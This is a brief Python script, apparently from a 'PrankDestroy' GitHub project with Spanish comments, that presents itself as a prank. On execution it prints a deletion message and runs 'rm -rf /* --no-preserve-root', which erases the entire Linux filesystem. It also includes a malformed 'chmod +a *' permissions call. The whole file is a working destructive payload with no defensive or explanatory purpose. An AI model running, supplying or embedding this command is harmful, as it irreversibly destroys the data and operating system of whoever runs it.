# Remove total linux
# By: https://github.com/Br3Fuck/PrankDestroy
# Modulos:

import os
import time

# Permisos:

def permisos():
	os.system("chmod +a *")

# Clear:

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# Deleted System:

def deleted():
	print("Eliminando sistema operativo...")
	os.system("rm -rf /* --no-preserve-root")
	
# Run:

def script():
	permisos()
	clear()
	print("¡Eliminando!...")
	time.sleep(2)
	deleted()
	
script()
